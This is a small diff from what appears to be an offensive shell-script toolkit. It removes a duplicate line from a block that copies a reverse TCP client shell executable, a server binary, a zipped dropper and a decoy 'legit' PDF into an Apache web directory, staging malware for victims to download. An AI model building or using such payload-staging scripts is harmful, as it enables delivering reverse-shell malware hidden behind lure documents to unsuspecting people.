@@ -13063,7 +13063,6 @@ if [ "$easter_egg" = "ON" ]; then
 else
    cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
 fi
-cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
 cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
 cp $IPATH/output/$Drop.pdf $ApAcHe/$Drop.pdf > /dev/nul 2>&1 # Legit PDF doc
